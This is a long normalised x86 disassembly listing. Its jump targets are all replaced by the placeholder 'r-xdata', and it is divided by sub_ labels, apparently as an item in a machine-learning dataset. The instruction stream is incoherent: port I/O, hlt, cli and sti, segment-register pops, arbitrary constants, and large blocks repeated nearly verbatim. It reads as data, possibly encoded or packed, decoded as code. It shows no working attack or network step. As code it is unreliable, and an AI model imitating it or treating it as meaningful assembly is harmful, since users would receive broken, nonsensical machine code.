add [ esp + eax * 4 - 0x14141415 ] 0xeb
jmp r-xdata
je r-xdata
and dl [ edx - 0x7b7b62ab ]
jmp r-xdata
pop edx
sbb [ ebx + edi * 2 + 0x7b ] edx
mov edi 0xf6af3ef3
lahf
jmp r-xdata
jmp r-xdata
rcl [ edx + 0x7b7b7317 ] cl
jmp r-xdata
jae r-xdata
xchg edx eax
pop ebp
imul edi [ ebx + 0x7b ] 0xffffffeb
jmp r-xdata
out dx al
cmpsd [ esi ] [ edi ]
test [ ecx + edx + 0xb112314 ] al
jpo r-xdata
lahf
sub eax 0x63b29236
jmp r-xdata
xchg edx eax
int3
sub_479757
dec ebx
jpo r-xdata
jae r-xdata
sub edx [ ebx + 0x7b7b78fc ]
pop edi
jpo r-xdata
ja r-xdata
xchg ebx eax
mov ebx 0xebb8b225
jmp r-xdata
test ch ch
idiv [ ebx + 0x7b ]
dec eax
jpo r-xdata
jpo r-xdata
xor [ esi + 0x7b ] ebx
jpo r-xdata
jpo r-xdata
and ah [ edx ]
div [ esi ]
mov [ 0xffffffff923b112a ] eax
xor ebx [ edi + 0x7b ]
jpo r-xdata
jpo r-xdata
mov ebx 0x8731f274
cmp [ ebx - 0x2 ] ch
mov ebx 0x7bfbff74
jpo r-xdata
jpo r-xdata
sub al 0xfe
lea edx [ edx - 0x7b7b6c51 ]
jmp r-xdata
adc eax [ ebx - 0x6dcdbb49 ]
imul edx [ ecx + 0x7b ] 0x8306f27b
jpo r-xdata
jmp r-xdata
jpo r-xdata
xchg edx eax
dec ebp
mov [ 0xffffffffebeb8484 ] eax
jmp r-xdata
mov esp 0x814a33e
adc al 0x1d
mov esp 0x5b0fa73e
xchg ebx eax
jmp r-xdata
xchg edx eax
idiv [ esi ]
mov al [ 0xffffffff928dfe2c ]
scasd [ edi ]
xchg ebx eax
test [ ebx + ebp * 8 - 0xd141415 ] al
mov [ es : 0x7b6a7592 ] eax
jpo r-xdata
jmp r-xdata
test bl ch
xchg ebx eax
r-xdata
cvtdq2ps xmm6 [ ebx ]
or eax 0x84a68692
jmp r-xdata
fidivr [ ecx + 0x7b ]
jpo r-xdata
mov al [ esp + eax * 4 + 0x6e5f922c ]
adc esi [ esi + 0x2c1e796a ]
cmp eax 0x79da935b
jpo r-xdata
jge r-xdata
mov esp 0x2d15c73e
xchg ebx eax
jmp r-xdata
jpo r-xdata
test [ edx + eax * 2 - 0x406d7cfa ] al
dec ebx
jpo r-xdata
jmp r-xdata
jg r-xdata
adc [ edi ] edi
jmp r-xdata
xchg [ edx + 0x7b7b5970 ] edx
jmp r-xdata
[ esi ]
bound edi [ ebx + 0x7b ]
clc
mov ebx 0x6b529279
jpo r-xdata
imul edi [ ebx + 0x7b ] 0xffffffeb
in al dx
0x71928484 0x7b7d
jpo r-xdata
test [ edx + 0x6 ] al
adc [ edx + 0x7b7b4bbf ] 0xffffff93
mov esp 0xeb7b7b4a
sub [ 0x7bc7cbf0 ] ch
jpo r-xdata
jpo r-xdata
jmp r-xdata
inc ecx
jno r-xdata
xchg edx eax
xchg edx eax
xchg ebx eax
cmp esi [ edi + 0x7b ]
jpo r-xdata
xor ecx [ 0xffffffff84a68692 ]
sbb eax 0xfa73ebc
pop ebx
jpo r-xdata
push esi
jpo r-xdata
jae r-xdata
hlt
and al 0x11
add esp [ ecx ]
adc [ edx + edx * 4 ] edi
jmp r-xdata
imul edi esi 0xffffffbb
je r-xdata
dec eax
adc eax 0x7b568892
jpo r-xdata
inc ecx
and edx [ ecx ]
[ esi ] [ edi ]
and edx [ ecx ]
adc al 0x1d
[ edi ] [ esi ]
and edx [ ecx ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
sbb eax 0xf0d53ef2
mov ch 0xf6
mov bh 0x1d
push cs
xlat
jmp r-xdata
jmp r-xdata
test ah cl
cmpsd [ esi ] [ edi ]
jpo r-xdata
dec eax
test [ edx - 0x7b7b6d3a ] dl
jmp r-xdata
aas
sti
jpo r-xdata
and [ 0x23a73ef2 ] ebx
jmp r-xdata
je r-xdata
jmp r-xdata
test bl ch
jmp r-xdata
xchg edx eax
in al 0x9a
test [ ebx + ebp * 8 - 0x14141415 ] al
sub eax 0x3928bf0
jpo r-xdata
adc [ ebx + 0x23a53ef2 ] edx
adc [ 0x7b568892 ] edx
sbb eax 0x23a73ef2
test [ esi + esi * 8 - 0x7b794c0a ] al
test dh dh
jpo r-xdata
jpo r-xdata
push edx
mov al [ esp + eax * 4 + 0x6e5f922c ]
adc [ ecx ] esp
test [ ebx + ebp * 8 + 0x6af1ebeb ] al
xchg edx eax
loopne r-xdata
jmp r-xdata
or al 0x7b
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
je r-xdata
test [ edx ] ah
xchg edx eax
push ebp
popfd
jmp r-xdata
jmp r-xdata
test [ ebx + ebp * 8 + 0x68ed013 ] al
inc edi
sub [ edx - 0x7b7b6548 ] dl
jmp r-xdata
sub eax 0xeb8484a3
jmp r-xdata
mov edi 0x79112877
test [ 0x7dc99277 ] ch
test bl ch
jmp r-xdata
jae r-xdata
jmp r-xdata
jpo r-xdata
mov al [ 0x2126f21d ]
xchg edx eax
jpo r-xdata
jmp r-xdata
xchg edx eax
clc
jno r-xdata
jmp r-xdata
xchg ebx eax
hlt
jpo r-xdata
je r-xdata
or edx [ edx + 0x7b7b6b5d ]
movsd [ edi ] [ esi ]
xchg edx eax
leave
add [ esp + eax * 4 + 0x112c2c2b ] 0x5b
sub al 0x2c
sub al 0x2c
idiv bh
pop edi
jmp r-xdata
xor [ ss : 0x63b29236 ] ch
jpo r-xdata
jmp r-xdata
mov ebx 0x84a45592
test bl ch
dec eax
mov ebx 0xebebebb8
jmp r-xdata
jmp r-xdata
idiv [ esi ]
imul ebp [ ebx ] 0x13
jge r-xdata
jpo r-xdata
xchg ebx eax
jmp r-xdata
jmp r-xdata
sub edx [ ebx + 0x7b7b5406 ]
jpo r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
lahf
jmp r-xdata
mov dl 0xa0
test [ ebx + ebp * 8 + 0x6e92ebeb ] al
jge r-xdata
and ecx [ eax - 0x60 ]
sbb eax 0x922126f2
jmp r-xdata
jmp r-xdata
xchg edx eax
pop es
jg r-xdata
clc
jmp r-xdata
jns r-xdata
outsd
jmp r-xdata
adc al 0x23
jmp r-xdata
jpo r-xdata
sub eax 0x7dc99277
jmp r-xdata
jmp r-xdata
jpo r-xdata
mov esp 0x362d933e
xor [ 0x36973ebc ] ch
xor [ 0x63b29236 ] ch
mov esp 0x3036973e
jpo r-xdata
xchg ebx eax
idiv [ esi ]
rcl [ edx + 0x7b7b7317 ] cl
mov edi 0xf6af3ef3
jmp r-xdata
sub dh dh
xchg edx eax
pop ds
push eax
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc [ ebx ] ecx
test bl ch
jmp r-xdata
push esp
jpo r-xdata
sub edx [ ebx + 0x7b7b5419 ]
jmp r-xdata
jpo r-xdata
adc [ ebx - 0x6e ] edi
in al dx
push edx
jpo r-xdata
div dh

stosd [ edi ]
add [ esp + eax * 4 - 0x14141415 ] 0xeb
jmp r-xdata
je r-xdata
and dl [ edx - 0x7b7b62ab ]
jmp r-xdata
pop edx
sbb [ ebx + edi * 2 + 0x7b ] edx
mov edi 0xf6af3ef3
lahf
jmp r-xdata
jmp r-xdata
rcl [ edx + 0x7b7b7317 ] cl
jmp r-xdata
jae r-xdata
xchg edx eax
pop ebp
imul edi [ ebx + 0x7b ] 0xffffffeb
jmp r-xdata
out dx al
cmpsd [ esi ] [ edi ]
test [ ecx + edx + 0xb112314 ] al
jpo r-xdata
lahf
sub eax 0x63b29236
jmp r-xdata
xchg edx eax
int3
sub_4797d4
cmp eax 0x78779373
jpo r-xdata
sub al 0xfe
lea edx [ edx - 0x7b7b6c51 ]
jmp r-xdata
adc eax [ ebx - 0x6dcdbb49 ]
imul edx [ ecx + 0x7b ] 0x8306f27b
test ch ch
idiv [ ebx + 0x7b ]
jmp r-xdata
jpo r-xdata
mov ebx 0x8731f274
imul edi [ ebx + 0x7b ] 0xffffffeb
mov esp 0x814a33e
adc al 0x1d
mov esp 0x5b0fa73e
xchg ebx eax
in al dx
0x71928484 0x7b7d
jpo r-xdata
jmp r-xdata
jpo r-xdata
test [ edx + eax * 2 - 0x406d7cfa ] al
dec ebx
jpo r-xdata
jmp r-xdata
xchg edx eax
hlt
xchg ebx eax
cmp esi [ edi + 0x7b ]
jpo r-xdata
xor ecx [ 0xffffffff84a68692 ]
sbb eax 0xfa73ebc
pop ebx
test bl ch
xchg ebx eax
r-xdata
cvtdq2ps xmm6 [ ebx ]
or eax 0x84a68692
jmp r-xdata
sub_47980b
[ edi - 0x71 ]
test [ ecx + edx + 0x5e112359 ] al
xchg edx eax
xor [ esi + 0x7b ] ebx
jpo r-xdata
jpo r-xdata
jmp r-xdata
cvtdq2ps xmm6 [ ebx ]
or eax 0x84a68692
jmp r-xdata
fidivr [ ecx + 0x7b ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
test [ edx + 0x6 ] al
adc [ edx + 0x7b7b4bbf ] 0xffffff93
jpo r-xdata
mov esp 0xeb7b7b4a
sub [ 0x7bc7cbf0 ] ch
jpo r-xdata
xchg edx eax
xchg ebx eax
cmp esi [ edi + 0x7b ]
jpo r-xdata
test [ edx + eax * 2 - 0x406d7cfa ] al
dec ebx
jpo r-xdata
jmp r-xdata
sub al 0xfe
lea edx [ edx - 0x7b7b6c51 ]
jmp r-xdata
adc eax [ ebx - 0x6dcdbb49 ]
imul edx [ ecx + 0x7b ] 0x8306f27b
test ch ch
idiv [ ebx + 0x7b ]
imul edi esi 0xffffffbb
je r-xdata
dec eax
mov al [ 0xffffffff928dfe2c ]
scasd [ edi ]
xchg ebx eax
test [ ebx + ebp * 8 - 0xd141415 ] al
mov [ es : 0x7b6a7592 ] eax
jpo r-xdata
jmp r-xdata
test bl ch
xchg ebx eax
r-xdata
mov esp 0x814a33e
adc al 0x1d
mov esp 0x5b0fa73e
in al dx
0x71928484 0x7b7d
jpo r-xdata
xchg ebx eax
xor ecx [ 0xffffffff84a68692 ]
sbb eax 0xfa73ebc
pop ebx
jmp r-xdata
jpo r-xdata
mov ebx 0x8731f274
sti
jpo r-xdata
xchg [ edx + 0x7b7b5970 ] edx
jmp r-xdata
[ esi ]
bound edi [ ebx + 0x7b ]
clc
mov ebx 0x6b529279
jpo r-xdata
imul edi [ ebx + 0x7b ] 0xffffffeb
jmp r-xdata
jpo r-xdata
hlt
and al 0x11
add esp [ ecx ]
adc [ edx + edx * 4 ] edi
jmp r-xdata
[ esi ] [ edi ]
and edx [ ecx ]
adc al 0x1d
[ edi ] [ esi ]
and edx [ ecx ]
or al 0x7b
jpo r-xdata
jpo r-xdata
jpo r-xdata
and [ 0x23a73ef2 ] ebx
adc [ edi ] edi
jmp r-xdata
mov al [ esp + eax * 4 + 0x6e5f922c ]
adc esi [ esi + 0x2c1e796a ]
cmp eax 0x79da935b
jpo r-xdata
push esi
jpo r-xdata
jae r-xdata
jpo r-xdata
jmp r-xdata
inc ecx
jno r-xdata
xchg edx eax
jmp r-xdata
jmp r-xdata
test ah cl
cmpsd [ esi ] [ edi ]
jpo r-xdata
dec eax
test [ edx - 0x7b7b6d3a ] dl
jmp r-xdata
aas
adc eax 0x7b568892
inc ecx
and edx [ ecx ]
jpo r-xdata
jpo r-xdata
adc [ ebx + 0x23a53ef2 ] edx
adc [ 0x7b568892 ] edx
sbb eax 0x23a73ef2
test [ esi + esi * 8 - 0x7b794c0a ] al
test dh dh
jpo r-xdata
je r-xdata
jmp r-xdata
test [ ebx + ebp * 8 + 0x6af1ebeb ] al
xchg edx eax
loopne r-xdata
jmp r-xdata
test bl ch
jmp r-xdata
xchg edx eax
in al 0x9a
test [ ebx + ebp * 8 - 0x14141415 ] al
sub eax 0x3928bf0
jg r-xdata
jpo r-xdata
push edx
mov al [ esp + eax * 4 + 0x6e5f922c ]
adc [ ecx ] esp
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
je r-xdata
test [ edx ] ah
xchg edx eax
push ebp
popfd
jmp r-xdata
sbb eax 0xf0d53ef2
mov ch 0xf6
mov bh 0x1d
push cs
xlat
jmp r-xdata
test [ ebx + ebp * 8 + 0x68ed013 ] al
inc edi
sub [ edx - 0x7b7b6548 ] dl
jmp r-xdata
sub eax 0xeb8484a3
jmp r-xdata
mov edi 0x79112877
test [ 0x7dc99277 ] ch
test bl ch
jmp r-xdata
jae r-xdata
jmp r-xdata
jpo r-xdata
mov al [ 0x2126f21d ]
xchg edx eax
jpo r-xdata
jmp r-xdata
xchg edx eax
clc
jno r-xdata
jmp r-xdata
xchg ebx eax
hlt
jpo r-xdata
je r-xdata
or edx [ edx + 0x7b7b6b5d ]
movsd [ edi ] [ esi ]
xchg edx eax
leave
add [ esp + eax * 4 + 0x112c2c2b ] 0x5b
sub al 0x2c
sub al 0x2c
idiv bh
pop edi
jmp r-xdata
xor [ ss : 0x63b29236 ] ch
jpo r-xdata
jmp r-xdata
mov ebx 0x84a45592
test bl ch
dec eax
mov ebx 0xebebebb8
jmp r-xdata
jmp r-xdata
idiv [ esi ]
imul ebp [ ebx ] 0x13
jge r-xdata
jpo r-xdata
xchg ebx eax
jmp r-xdata
jmp r-xdata
sub edx [ ebx + 0x7b7b5406 ]
jpo r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
lahf
jmp r-xdata
mov dl 0xa0
test [ ebx + ebp * 8 + 0x6e92ebeb ] al
jge r-xdata
and ecx [ eax - 0x60 ]
sbb eax 0x922126f2
jmp r-xdata
jmp r-xdata
xchg edx eax
pop es
jg r-xdata
clc
jmp r-xdata
jns r-xdata
outsd
jmp r-xdata
adc al 0x23
jmp r-xdata
jpo r-xdata
sub eax 0x7dc99277
jmp r-xdata
jmp r-xdata
jpo r-xdata
mov esp 0x362d933e
xor [ 0x36973ebc ] ch
xor [ 0x63b29236 ] ch
mov esp 0x3036973e
jpo r-xdata
xchg ebx eax
idiv [ esi ]
rcl [ edx + 0x7b7b7317 ] cl
mov edi 0xf6af3ef3
jmp r-xdata
sub dh dh
xchg edx eax
pop ds
push eax
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc [ ebx ] ecx
test bl ch
jmp r-xdata
push esp
jpo r-xdata
sub edx [ ebx + 0x7b7b5419 ]
jmp r-xdata
jpo r-xdata
adc [ ebx - 0x6e ] edi
in al dx
push edx
jpo r-xdata
div dh

stosd [ edi ]
add [ esp + eax * 4 - 0x14141415 ] 0xeb
jmp r-xdata
je r-xdata
and dl [ edx - 0x7b7b62ab ]
jmp r-xdata
pop edx
sbb [ ebx + edi * 2 + 0x7b ] edx
mov edi 0xf6af3ef3
lahf
jmp r-xdata
jmp r-xdata
rcl [ edx + 0x7b7b7317 ] cl
jmp r-xdata
jae r-xdata
xchg edx eax
pop ebp
imul edi [ ebx + 0x7b ] 0xffffffeb
jmp r-xdata
out dx al
cmpsd [ esi ] [ edi ]
test [ ecx + edx + 0xb112314 ] al
jpo r-xdata
lahf
sub eax 0x63b29236
jmp r-xdata
xchg edx eax
int3
sub_47982d
mov eax 0x3df22cca
xchg ebx eax
aam 0x79
mov al [ esp + eax * 4 + 0x6e5f922c ]
adc esi [ esi + 0x2c1e796a ]
cmp eax 0x79da935b
jpo r-xdata
jpo r-xdata
jmp r-xdata
inc ecx
jno r-xdata
xchg edx eax
mov esp 0xeb7b7b4a
sub [ 0x7bc7cbf0 ] ch
jpo r-xdata
adc eax 0x7b568892
jpo r-xdata
inc ecx
and edx [ ecx ]
[ esi ] [ edi ]
and edx [ ecx ]
adc al 0x1d
[ edi ] [ esi ]
and edx [ ecx ]
jpo r-xdata
imul edi esi 0xffffffbb
je r-xdata
dec eax
mov al [ 0xffffffff928dfe2c ]
scasd [ edi ]
xchg ebx eax
test [ ebx + ebp * 8 - 0xd141415 ] al
mov [ es : 0x7b6a7592 ] eax
jpo r-xdata
and [ 0x23a73ef2 ] ebx
jmp r-xdata
je r-xdata
jmp r-xdata
sti
jpo r-xdata
xchg [ edx + 0x7b7b5970 ] edx
jmp r-xdata
[ esi ]
bound edi [ ebx + 0x7b ]
clc
mov ebx 0x6b529279
jpo r-xdata
jpo r-xdata
push edx
mov al [ esp + eax * 4 + 0x6e5f922c ]
adc [ ebx + 0x23a53ef2 ] edx
adc [ 0x7b568892 ] edx
adc [ ecx ] esp
jpo r-xdata
and al 0x11
add esp [ ecx ]
adc [ edx + edx * 4 ] edi
hlt
jmp r-xdata
or al 0x7b
jpo r-xdata
jpo r-xdata
adc [ edi ] edi
jmp r-xdata
push esi
jpo r-xdata
jae r-xdata
jmp r-xdata
jmp r-xdata
test ah cl
cmpsd [ esi ] [ edi ]
jpo r-xdata
dec eax
test [ edx - 0x7b7b6d3a ] dl
jmp r-xdata
aas
jpo r-xdata
sbb eax 0x23a73ef2
test [ esi + esi * 8 - 0x7b794c0a ] al
test dh dh
jpo r-xdata
test [ ebx + ebp * 8 + 0x6af1ebeb ] al
xchg edx eax
loopne r-xdata
jmp r-xdata
test bl ch
jmp r-xdata
xchg edx eax
in al 0x9a
test [ ebx + ebp * 8 - 0x14141415 ] al
sub eax 0x3928bf0
jg r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
je r-xdata
test [ edx ] ah
xchg edx eax
push ebp
popfd
jmp r-xdata
sbb eax 0xf0d53ef2
mov ch 0xf6
mov bh 0x1d
push cs
xlat
jmp r-xdata
test [ ebx + ebp * 8 + 0x68ed013 ] al
inc edi
sub [ edx - 0x7b7b6548 ] dl
jmp r-xdata
sub eax 0xeb8484a3
jmp r-xdata
mov edi 0x79112877
test [ 0x7dc99277 ] ch
test bl ch
jmp r-xdata
jae r-xdata
jmp r-xdata
jpo r-xdata
mov al [ 0x2126f21d ]
xchg edx eax
jpo r-xdata
jmp r-xdata
xchg edx eax
clc
jno r-xdata
jmp r-xdata
xchg ebx eax
hlt
jpo r-xdata
je r-xdata
or edx [ edx + 0x7b7b6b5d ]
movsd [ edi ] [ esi ]
xchg edx eax
leave
add [ esp + eax * 4 + 0x112c2c2b ] 0x5b
sub al 0x2c
sub al 0x2c
idiv bh
pop edi
jmp r-xdata
xor [ ss : 0x63b29236 ] ch
jpo r-xdata
jmp r-xdata
mov ebx 0x84a45592
test bl ch
dec eax
mov ebx 0xebebebb8
jmp r-xdata
jmp r-xdata
idiv [ esi ]
imul ebp [ ebx ] 0x13
jge r-xdata
jpo r-xdata
xchg ebx eax
jmp r-xdata
jmp r-xdata
sub edx [ ebx + 0x7b7b5406 ]
jpo r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
lahf
jmp r-xdata
mov dl 0xa0
test [ ebx + ebp * 8 + 0x6e92ebeb ] al
jge r-xdata
and ecx [ eax - 0x60 ]
sbb eax 0x922126f2
jmp r-xdata
jmp r-xdata
xchg edx eax
pop es
jg r-xdata
clc
jmp r-xdata
jns r-xdata
outsd
jmp r-xdata
adc al 0x23
jmp r-xdata
jpo r-xdata
sub eax 0x7dc99277
jmp r-xdata
jmp r-xdata
jpo r-xdata
mov esp 0x362d933e
xor [ 0x36973ebc ] ch
xor [ 0x63b29236 ] ch
mov esp 0x3036973e
jpo r-xdata
xchg ebx eax
idiv [ esi ]
rcl [ edx + 0x7b7b7317 ] cl
mov edi 0xf6af3ef3
jmp r-xdata
sub dh dh
xchg edx eax
pop ds
push eax
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc [ ebx ] ecx
test bl ch
jmp r-xdata
push esp
jpo r-xdata
sub edx [ ebx + 0x7b7b5419 ]
jmp r-xdata
jpo r-xdata
adc [ ebx - 0x6e ] edi
in al dx
push edx
jpo r-xdata
div dh

stosd [ edi ]
add [ esp + eax * 4 - 0x14141415 ] 0xeb
jmp r-xdata
je r-xdata
and dl [ edx - 0x7b7b62ab ]
jmp r-xdata
pop edx
sbb [ ebx + edi * 2 + 0x7b ] edx
mov edi 0xf6af3ef3
lahf
jmp r-xdata
jmp r-xdata
rcl [ edx + 0x7b7b7317 ] cl
jmp r-xdata
jae r-xdata
xchg edx eax
pop ebp
imul edi [ ebx + 0x7b ] 0xffffffeb
jmp r-xdata
out dx al
cmpsd [ esi ] [ edi ]
test [ ecx + edx + 0xb112314 ] al
jpo r-xdata
lahf
sub eax 0x63b29236
jmp r-xdata
xchg edx eax
int3
sub_4798c8
dec [ edi - 0xf848497 ]
cmp [ ebx - 0x2 ] ch
mov ebx 0x7bfbff74
jpo r-xdata
jmp r-xdata
xchg edx eax
or al 0x7b
jpo r-xdata
jg r-xdata
adc [ edi ] edi
jmp r-xdata
jpo r-xdata
push esi
jpo r-xdata
jae r-xdata
jpo r-xdata
sbb eax 0xf0d53ef2
mov ch 0xf6
mov bh 0x1d
push cs
xlat
jmp r-xdata
jmp r-xdata
test ah cl
cmpsd [ esi ] [ edi ]
jpo r-xdata
dec eax
test [ edx - 0x7b7b6d3a ] dl
jmp r-xdata
aas
test bl ch
jmp r-xdata
xchg edx eax
in al 0x9a
test [ ebx + ebp * 8 - 0x14141415 ] al
sub eax 0x3928bf0
jpo r-xdata
sbb eax 0x23a73ef2
test [ esi + esi * 8 - 0x7b794c0a ] al
test dh dh
test [ ebx + ebp * 8 + 0x6af1ebeb ] al
xchg edx eax
loopne r-xdata
jmp r-xdata
adc [ ebx + 0x23a53ef2 ] edx
adc [ 0x7b568892 ] edx
and [ 0x23a73ef2 ] ebx
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
[ esi ] [ edi ]
and edx [ ecx ]
adc al 0x1d
[ edi ] [ esi ]
and edx [ ecx ]
adc eax 0x7b568892
jmp r-xdata
jpo r-xdata
jpo r-xdata
je r-xdata
test [ edx ] ah
xchg edx eax
push ebp
popfd
jmp r-xdata
jmp r-xdata
test [ ebx + ebp * 8 + 0x68ed013 ] al
inc edi
sub [ edx - 0x7b7b6548 ] dl
jmp r-xdata
sub eax 0xeb8484a3
jmp r-xdata
mov edi 0x79112877
test [ 0x7dc99277 ] ch
test bl ch
jmp r-xdata
jae r-xdata
jmp r-xdata
jpo r-xdata
mov al [ 0x2126f21d ]
xchg edx eax
jpo r-xdata
jmp r-xdata
xchg edx eax
clc
jno r-xdata
jmp r-xdata
xchg ebx eax
hlt
jpo r-xdata
je r-xdata
or edx [ edx + 0x7b7b6b5d ]
movsd [ edi ] [ esi ]
xchg edx eax
leave
add [ esp + eax * 4 + 0x112c2c2b ] 0x5b
sub al 0x2c
sub al 0x2c
idiv bh
pop edi
jmp r-xdata
xor [ ss : 0x63b29236 ] ch
jpo r-xdata
jmp r-xdata
mov ebx 0x84a45592
test bl ch
dec eax
mov ebx 0xebebebb8
jmp r-xdata
jmp r-xdata
idiv [ esi ]
imul ebp [ ebx ] 0x13
jge r-xdata
jpo r-xdata
xchg ebx eax
jmp r-xdata
jmp r-xdata
sub edx [ ebx + 0x7b7b5406 ]
jpo r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
lahf
jmp r-xdata
mov dl 0xa0
test [ ebx + ebp * 8 + 0x6e92ebeb ] al
jge r-xdata
and ecx [ eax - 0x60 ]
sbb eax 0x922126f2
jmp r-xdata
jmp r-xdata
xchg edx eax
pop es
jg r-xdata
clc
jmp r-xdata
jns r-xdata
outsd
jmp r-xdata
adc al 0x23
jmp r-xdata
jpo r-xdata
sub eax 0x7dc99277
jmp r-xdata
jmp r-xdata
jpo r-xdata
mov esp 0x362d933e
xor [ 0x36973ebc ] ch
xor [ 0x63b29236 ] ch
mov esp 0x3036973e
jpo r-xdata
xchg ebx eax
idiv [ esi ]
rcl [ edx + 0x7b7b7317 ] cl
mov edi 0xf6af3ef3
jmp r-xdata
sub dh dh
xchg edx eax
pop ds
push eax
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc [ ebx ] ecx
test bl ch
jmp r-xdata
push esp
jpo r-xdata
sub edx [ ebx + 0x7b7b5419 ]
jmp r-xdata
jpo r-xdata
adc [ ebx - 0x6e ] edi
in al dx
push edx
jpo r-xdata
div dh

stosd [ edi ]
add [ esp + eax * 4 - 0x14141415 ] 0xeb
jmp r-xdata
je r-xdata
and dl [ edx - 0x7b7b62ab ]
jmp r-xdata
pop edx
sbb [ ebx + edi * 2 + 0x7b ] edx
mov edi 0xf6af3ef3
lahf
jmp r-xdata
jmp r-xdata
rcl [ edx + 0x7b7b7317 ] cl
jmp r-xdata
jae r-xdata
xchg edx eax
pop ebp
imul edi [ ebx + 0x7b ] 0xffffffeb
jmp r-xdata
out dx al
cmpsd [ esi ] [ edi ]
test [ ecx + edx + 0xb112314 ] al
jpo r-xdata
lahf
sub eax 0x63b29236
jmp r-xdata
xchg edx eax
int3
sub_4798e8
jmp r-xdata
jo r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
cmp [ 0x1de32ef2 ] ebx
push es
out dx eax
and al 0x11
add esp [ ecx ]
adc [ edx + edx * 4 ] edi
hlt
jmp r-xdata
jmp r-xdata
test bl ch
jmp r-xdata
[ esi ] [ edi ]
and edx [ ecx ]
adc al 0x1d
[ edi ] [ esi ]
and edx [ ecx ]
adc eax 0x7b568892
jmp r-xdata
jpo r-xdata
and [ 0x23a73ef2 ] ebx
jmp r-xdata
adc [ ebx + 0x23a53ef2 ] edx
adc [ 0x7b568892 ] edx
sbb eax 0x23a73ef2
sub_47991a
maxps xmm6 [ edi + 0x11 ]
cli
xchg edi eax
push edi
jns r-xdata
jpo r-xdata
and edx [ ecx ]
jpo r-xdata
jmp r-xdata
imul edi [ ebx + 0x11 ] 0x78
adc esi [ ebx + 0x13 ]
pop eax
xchg edx eax
pushad
jle r-xdata
jpo r-xdata
adc eax 0x7b568892
jpo r-xdata
inc ecx
and edx [ ecx ]
idiv [ esi ]
mov bh 0x1d
push cs
xlat
jmp r-xdata
jpo r-xdata
test [ edx ] ah
xchg edx eax
push ebp
popfd
test [ ebx + ebp * 8 + 0x68ed013 ] al
inc edi
sub [ edx - 0x7b7b6548 ] dl
jmp r-xdata
and [ 0x23a73ef2 ] ebx
adc [ ebx + 0x23a53ef2 ] edx
adc [ 0x7b568892 ] edx
jmp r-xdata
jmp r-xdata
ja r-xdata
jmp r-xdata
[ esi ] [ edi ]
and edx [ ecx ]
adc al 0x1d
[ edi ] [ esi ]
and edx [ ecx ]
or edx [ edx + 0x7b7b6b5d ]
jmp r-xdata
jpo r-xdata
sub_479992
push cs
jmp r-xdata
xchg edx eax
out dx al
cmpsd [ esi ] [ edi ]
test [ ecx + edx + 0xb112314 ] al
xchg edx eax
pop ebp
imul edi [ ebx + 0x7b ] 0xffffffeb
jmp r-xdata
jae r-xdata
jpo r-xdata
stosd [ edi ]
add [ esp + eax * 4 - 0x14141415 ] 0xeb
jmp r-xdata
je r-xdata
sub_4799a1
xchg [ eax - 0x48 ] eax
xchg edx eax
sub edi [ ecx + 0x7b ]
stosd [ edi ]
add [ esp + eax * 4 - 0x14141415 ] 0xeb
jmp r-xdata
je r-xdata
jae r-xdata
out dx al
cmpsd [ esi ] [ edi ]
test [ ecx + edx + 0xb112314 ] al
xchg edx eax
pop ebp
imul edi [ ebx + 0x7b ] 0xffffffeb
jmp r-xdata
jmp r-xdata
xchg edx eax
jpo r-xdata
sub_479a59
xchg edx eax
dec esi
pop edi
jpo r-xdata
mov eax [ esp + eax * 4 - 0x14141415 ]
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
sbb [ ebx + edi * 2 + 0x7b ] edx
clc
mov edi 0x79112877
test [ 0x7dc99277 ] ch
jpo r-xdata
jmp r-xdata
xchg edx eax
clc
jno r-xdata
jmp r-xdata
test [ edx ] ah
xchg edx eax
push ebp
popfd
test [ ebx + ebp * 8 + 0x68ed013 ] al
inc edi
sub [ edx - 0x7b7b6548 ] dl
idiv [ esi ]
imul ebp [ ebx ] 0x13
jge r-xdata
jpo r-xdata
xchg ebx eax
jmp r-xdata
jns r-xdata
outsd
pop edx
jmp r-xdata
mov edi 0xf6af3ef3
jmp r-xdata
sub dh dh
jmp r-xdata
xchg edx eax
pop ds
push eax
jpo r-xdata
jpo r-xdata
xchg ebx eax
idiv [ esi ]
rcl [ edx + 0x7b7b7317 ] cl
lahf
jpo r-xdata
mov esp 0x362d933e
xor [ 0x36973ebc ] ch
xor [ 0x63b29236 ] ch
adc [ ebx - 0x6e ] edi
in al dx
push edx
jpo r-xdata
div dh

mov edi 0xf6af3ef3
lahf
jmp r-xdata
jmp r-xdata
rcl [ edx + 0x7b7b7317 ] cl
jmp r-xdata
lahf
jpo r-xdata
sub eax 0x63b29236
sub_479a73
xchg edx eax
dec esp
pop ebp
jpo r-xdata
cmp al 0x84
aaa
pop edi
arpl [ edx - 0x7b7b6f92 ] dx
jmp r-xdata
jmp r-xdata
push ecx
jpo r-xdata
jmp r-xdata
movsd [ edi ] [ esi ]
xchg edx eax
leave
add [ esp + eax * 4 + 0x112c2c2b ] 0x5b
sub al 0x2c
sub al 0x2c
idiv bh
pop edi
jmp r-xdata
jge r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
test [ edx + 0x7b7b71f8 ] dl
jmp r-xdata
jpo r-xdata
jmp r-xdata
pop edx
sub edx [ ebx + 0x7b7b5419 ]
jmp r-xdata
push esp
jpo r-xdata
jmp r-xdata
xchg edx eax
pop ds
push eax
jpo r-xdata
xchg edx eax
clc
jno r-xdata
jmp r-xdata
clc
mov edi 0x79112877
test [ 0x7dc99277 ] ch
